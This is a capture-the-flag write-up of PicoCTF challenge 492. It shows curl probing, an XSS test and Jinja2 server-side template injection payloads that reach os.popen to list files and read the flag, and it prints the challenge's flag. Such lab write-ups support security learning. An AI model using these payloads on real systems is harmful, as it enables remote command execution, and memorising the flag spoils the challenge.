---
title: 'PicoCTF Writeup #492'
date: 2025-08-19T11:09:54+07:00
draft: false
description: ''
tags: ['CTF', 'ssti']
---


## PicoCTF Writeup – Server-Side Template Injection (SSTI)

Recently, I played around with a PicoCTF [challenge 492](https://play.picoctf.org/practice/challenge/492). The challenge looked like a simple web app that lets you "announce whatever you want." Naturally, I fired up my terminal and started poking at it with `curl`. By the way, we can also visit the website and experiment with the form instead.

```bash
curl -X GET http://rescued-float.picoctf.net:49878/announce -i
```

Response:

```
HTTP/1.1 405 METHOD NOT ALLOWED
Allow: POST, OPTIONS
```

Looks like only `POST` is allowed, so I retried with:

```bash
curl -X POST http://rescued-float.picoctf.net:49878/announce -i
```

This time, I got a `200 OK`. Sweet — we can actually interact with the app.


## First Thoughts

The description said:

> “I made a cool website where you can announce whatever you want!
> I heard templating is a cool and modular way to build web apps!”

That last line screamed *templating*. My first instinct was to try some basic XSS. Sure enough:

```html
<script>alert("HELO")</script>
```

triggered an alert box. Nice, but XSS wasn’t the way to the flag.


## Pivot to SSTI

The title of the challenge hinted at **Server-Side Template Injection (SSTI)**. From the headers I noticed the app was running **Werkzeug (Python/3.8)**. That strongly suggested **Jinja2** templating under the hood.

I tested with some Jinja syntax:

```
{{}}
```

and got an **Internal Server Error**. That confirmed I was on the right track — this was a template engine at work.


## Digging Deeper

Here’s where I hit a wall. I’d never really done an SSTI attack before. After some research, I learned about Python’s **MRO (Method Resolution Order)** and how it could be abused to reach Python internals, including modules like `os`.

Turns out you can chain through Jinja’s builtins and reach Python’s `os` library. Once you can execute system commands, it’s game over.

Payload to list files:

```jinja
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```

That revealed a file named `flag`.

Payload to read it:

```jinja
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```

And boom — got the flag.


## The Flag

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_73c99823}
```


## Takeaways

* Don’t stop at XSS — sometimes it’s just a red herring.
* Jinja2 + careless input handling = a playground for SSTI.
* The Method Resolution Order (MRO) trick is incredibly powerful when exploring Python internals.

This was my first real SSTI exploit, and it was a fun rabbit hole to fall into. Definitely a good reminder of how dangerous improper template handling can be.
